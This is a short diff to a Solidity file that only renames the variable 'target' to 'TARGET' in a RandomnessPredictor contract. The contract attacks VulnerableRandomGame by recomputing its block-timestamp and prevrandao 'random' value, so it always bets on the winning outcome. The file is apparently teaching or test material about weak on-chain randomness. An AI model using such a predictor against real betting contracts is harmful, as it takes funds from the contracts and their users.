@@ -18,10 +18,10 @@ contract VulnerableRandomGame {
 }
 
 contract RandomnessPredictor {
-    VulnerableRandomGame public immutable target;
+    VulnerableRandomGame public immutable TARGET;
 
     constructor(address targetAddress) {
-        target = VulnerableRandomGame(targetAddress);
+        TARGET = VulnerableRandomGame(targetAddress);
     }
 
     function attack() external payable {
@@ -30,7 +30,7 @@ contract RandomnessPredictor {
         uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 2;
         bool guessEven = randomValue == 0;
 
-        target.betOnEven{value: msg.value}(guessEven);
+        TARGET.betOnEven{value: msg.value}(guessEven);
     }
 
     receive() external payable {}
